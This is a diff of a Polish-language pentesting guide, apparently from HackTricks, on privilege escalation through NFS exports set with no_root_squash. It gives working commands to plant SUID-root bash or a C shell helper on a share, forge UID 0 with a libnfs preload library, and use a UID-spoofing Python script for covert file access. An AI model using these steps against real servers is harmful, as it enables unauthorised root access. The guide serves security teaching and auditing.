@@ -1,16 +1,14 @@
-# NFS No Root Squash Misconfiguration Privilege Escalation
+# Eskalacja uprawnień przez błędną konfigurację NFS No Root Squash
 
-{{#include ../../banners/hacktricks-training.md}}
+## Podstawowe informacje o squashing
 
-## Podstawowe informacje o Squashing
+W przypadku NFS AUTH_SYS/AUTH_UNIX serwer opiera sprawdzanie uprawnień do plików na wartościach `uid` i `gid` przesyłanych w każdym żądaniu RPC. Inne security flavors, takie jak Kerberos, używają innych danych uwierzytelniających, a serwer może mapować numeryczne dane uwierzytelniające przed sprawdzeniem uprawnień.<sup>[[4]](#references)[[5]](#references)</sup>
 
-NFS zazwyczaj (szczególnie w systemie Linux) ufa wskazanym przez klienta wartościom `uid` i `gid` podczas uzyskiwania dostępu do plików (jeśli nie jest używany Kerberos). Na serwerze można jednak skonfigurować pewne opcje, które **zmieniają to zachowanie**:
+- **`all_squash`**: Mapuje każdy UID i GID na konto anonimowe, którego wartością domyślną w systemie Linux jest `nobody` (65534). `no_all_squash` jest wartością domyślną dla żądań innych niż root.<sup>[[4]](#references)</sup>
+- **`root_squash`**: Jest to wartość domyślna w systemie Linux i mapuje żądania z UID/GID 0 (root) na konto anonimowe; inne UID i GID nie są poddawane squashingowi.<sup>[[4]](#references)</sup>
+- **`no_root_squash`**: Wyłącza root squashing, dzięki czemu żądania z UID/GID 0 mogą być traktowane na serwerze jako pochodzące od root.<sup>[[4]](#references)</sup>
 
-- **`all_squash`**: Mapuje wszystkie dostępy, przypisując każdego użytkownika i każdą grupę do **`nobody`** (65534 bez znaku / -2 ze znakiem). W rezultacie każdy jest `nobody` i żaden użytkownik nie jest używany.
-- **`root_squash`/`no_all_squash`**: Jest to ustawienie domyślne w systemie Linux i **mapuje tylko dostęp z uid 0 (root)**. W rezultacie dowolne wartości `UID` i `GID` są zaufane, ale `0` jest mapowane do `nobody` (więc nie jest możliwa impersonacja użytkownika root).
-- **``no_root_squash`**: Jeśli ta konfiguracja jest włączona, nawet użytkownik root nie jest mapowany. Oznacza to, że po zamontowaniu katalogu z taką konfiguracją można uzyskać do niego dostęp jako root.
-
-W pliku **/etc/exports**, jeśli znajdziesz katalog skonfigurowany z opcją **no_root_squash**, możesz uzyskać do niego **dostęp** jako **klient** i **zapisywać w nim** tak, jakbyś był lokalnym użytkownikiem **root** tej maszyny.
+Jeśli dozwolony klient może zamontować zapisywalny export w **`/etc/exports`** skonfigurowany z **`no_root_squash`**, jego żądania z UID/GID 0 mogą zapisywać w nim jako użytkownik root serwera.<sup>[[4]](#references)</sup>
 
 Więcej informacji o **NFS** znajdziesz tutaj:
 
@@ -18,14 +16,13 @@ Więcej informacji o **NFS** znajdziesz tutaj:
 ../../network-services-pentesting/nfs-service-pentesting.md
 {{#endref}}
 
-## Privilege Escalation
+## Eskalacja uprawnień
 
 ### Remote Exploit
 
 Opcja 1 z użyciem bash:
-- **Zamontowanie tego katalogu** na maszynie klienta, a następnie **skopiowanie jako root** do zamontowanego folderu pliku binarnego **/bin/bash** i nadanie mu uprawnień **SUID**, po czym **uruchomienie z maszyny ofiary** tego pliku binarnego bash.
-- Należy pamiętać, że aby uzyskać uprawnienia root wewnątrz udziału NFS, na serwerze musi być skonfigurowana opcja **`no_root_squash`**.
-- Jeśli jednak nie jest ona włączona, można uzyskać uprawnienia innego użytkownika, kopiując plik binarny do udziału NFS i nadając mu uprawnienia SUID użytkownika, którego uprawnienia chcesz uzyskać.
+- Na dozwolonym kliencie zamontuj zapisywalny export jako root, skopiuj do niego **`/bin/bash`**, ustaw jego bit **SUID**, a następnie uruchom go z poziomu victim mount, który nie używa `nosuid`.<sup>[[2]](#references)[[4]](#references)</sup>
+- Aby przesłany plik pozostał własnością root, serwer musi używać **`no_root_squash`**. Jeśli root jest poddawany squashingowi, binary SUID dla innego konta jest możliwe tylko wtedy, gdy klient może legalnie utworzyć je lub być jego właścicielem, używając numerycznego UID/GID tego konta.<sup>[[4]](#references)</sup>
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,8 +35,8 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Option 2 z użyciem skompilowanego kodu C:
-- **Zamontowanie tego katalogu** na maszynie klienckiej, a następnie **skopiowanie jako root** do zamontowanego folderu naszego skompilowanego payloadu, który wykorzysta uprawnienie SUID, nadanie mu praw **SUID** oraz **uruchomienie na maszynie ofiary** tego pliku binarnego (tutaj znajdziesz kilka [payloadów C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
+Opcja 2 z użyciem skompilowanego kodu C:
+- Zamontuj katalog z dozwolonego klienta, skopiuj do niego skompilowany payload wykorzystujący uprawnienia SUID, ustaw jego bit **SUID** i wykonaj go na hoście ofiary (zobacz niektóre [payloady C SUID](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
 - Te same ograniczenia co wcześniej
 ```bash
 #Attacker, as root user
@@ -57,18 +54,17 @@ cd <SHAREDD_FOLDER>
 ### Local Exploit
 
 > [!TIP]
-> Należy pamiętać, że jeśli możesz utworzyć **tunnel ze swojej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote do przeprowadzenia exploit, tunelując wymagane porty**.\
-> Poniższy trick jest potrzebny w przypadku, gdy plik `/etc/exports` **wskazuje adres IP**. W takim przypadku **nie będziesz w stanie** użyć **remote exploit** i konieczne będzie **wykorzystanie tego tricku**.\
-> Kolejnym wymaganiem, aby exploit zadziałał, jest to, aby **export wewnątrz `/etc/export`** **używał flagi `insecure`**.\
-> --_Nie jestem pewien, czy ten trick zadziała, jeśli `/etc/export` wskazuje adres IP_--
+> Należy pamiętać, że jeśli możesz utworzyć **tunel ze swojej maszyny do maszyny ofiary, nadal możesz użyć wersji Remote do wykorzystania tego privilege escalation, tunelując wymagane porty**.\
+> Poniższy trik jest przydatny, gdy `/etc/exports` ogranicza export do adresu IP ofiary: zdalny klient nie może go zamontować, ale lokalna technika może działać za pośrednictwem udziału już zamontowanego na dozwolonym hoście.<sup>[[2]](#references)</sup>\
+> W przypadku tej nieuprzywilejowanej metody libnfs export w **`/etc/exports`** musi używać flagi `insecure`, aby proces mógł korzystać z niezarezerwowanego portu źródłowego; `secure` jest ustawieniem domyślnym, jednak proces, który może dowiązać zarezerwowany port, nie potrzebuje tej opcji.<sup>[[1]](#references)[[4]](#references)</sup>
 
-### Basic Information
+### Podstawowe informacje
 
-Scenariusz obejmuje wykorzystanie zamontowanego udziału NFS na lokalnej maszynie, korzystając z luki w specyfikacji NFSv3, która pozwala klientowi określić własne uid/gid, potencjalnie umożliwiając nieautoryzowany dostęp. Exploit polega na użyciu [libnfs](https://github.com/sahlberg/libnfs), biblioteki umożliwiającej fałszowanie wywołań NFS RPC.<sup>[[1]](#references)</sup>
+Klient NFSv3 AUTH_UNIX dołącza swój efektywny UID, GID oraz grupy do każdego wywołania, a serwer używa ich podczas sprawdzania uprawnień. Ta lokalna technika wykorzystuje ten model, fałszując dane uwierzytelniające RPC za pośrednictwem [libnfs](https://github.com/sahlberg/libnfs); jego moduł preload obsługuje nadpisywanie UID/GID w kontekście NFS.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
-#### Compiling the Library
+#### Kompilowanie biblioteki
 
-Kroki kompilacji biblioteki mogą wymagać dostosowania w zależności od wersji kernela. W tym konkretnym przypadku wywołania systemowe fallocate zostały zakomentowane. Proces kompilacji obejmuje następujące polecenia:
+Przykład libnfs może wymagać dostosowania do jądra docelowego; użyty tutaj walkthrough wskazuje konkretnie na konieczność zakomentowania wywołań systemowych fallocate przed skompilowaniem modułu preload.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 ./bootstrap
 ./configure
@@ -77,29 +73,29 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 #### Przeprowadzanie Exploit
 
-Exploit polega na utworzeniu prostego programu w języku C (`pwn.c`), który podnosi uprawnienia do root, a następnie uruchamia shell. Program jest kompilowany, a wynikowy plik binarny (`a.out`) umieszczany na udziale z suid root, przy użyciu `ld_nfs.so` do sfałszowania uid w wywołaniach RPC:
+Przykład tworzy mały helper w języku C, który uruchamia shell, następnie umieszcza go na udziale i używa `ld_nfs.so` z UID 0 w kontekście NFS, aby nadać mu uprawnienia SUID-root.<sup>[[1]](#references)[[2]](#references)</sup>
 
-1. **Skompiluj kod exploit:**
+1. **Skompiluj kod exploita:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **Umieść exploit na udziale i zmodyfikuj jego uprawnienia, fałszując uid:**
+2. **Umieść exploit w udziale i zmodyfikuj jego uprawnienia, fałszując UID**.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **Wykonaj exploit, aby uzyskać uprawnienia root:**
+3. **Wykonaj exploit, aby uzyskać uprawnienia root**.<sup>[[2]](#references)</sup>
 ```bash
 /mnt/share/a.out
 #root
 ```
-### Bonus: NFShell dla dyskretnego dostępu do plików
+### Bonus: NFShell do dyskretnego dostępu do plików
 
-Po uzyskaniu root access do interakcji z udziałem NFS bez zmiany właściciela (aby uniknąć pozostawiania śladów) używany jest skrypt Python (nfsh.py). Skrypt ten dostosowuje uid do wartości odpowiadającej plikowi, do którego uzyskiwany jest dostęp, umożliwiając interakcję z plikami na udziale bez problemów z uprawnieniami:<sup>[[1]](#references)</sup>
+Po uzyskaniu dostępu root ten wzorzec `nfsh.py` ustawia efektywny UID na UID docelowego pliku przed uruchomieniem polecenia, umożliwiając dostęp bez rekurencyjnej zmiany właściciela.<sup>[[2]](#references)</sup>
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -118,13 +114,16 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-Uruchom tak:
+Uruchom jako:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## Referencje
+## References
 
-- [1] [Historia mniej znanego NFS privesc](https://www.errno.fr/nfs_privesc.html)
-
+- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
+- [2] [Historia mniej znanego NFS privesc](https://www.errno.fr/nfs_privesc.html)
+- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
+- [4] [exports(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [5] [RFC 1813: Specyfikacja protokołu NFS w wersji 3](https://datatracker.ietf.org/doc/html/rfc1813)
 {{#include ../../banners/hacktricks-training.md}}
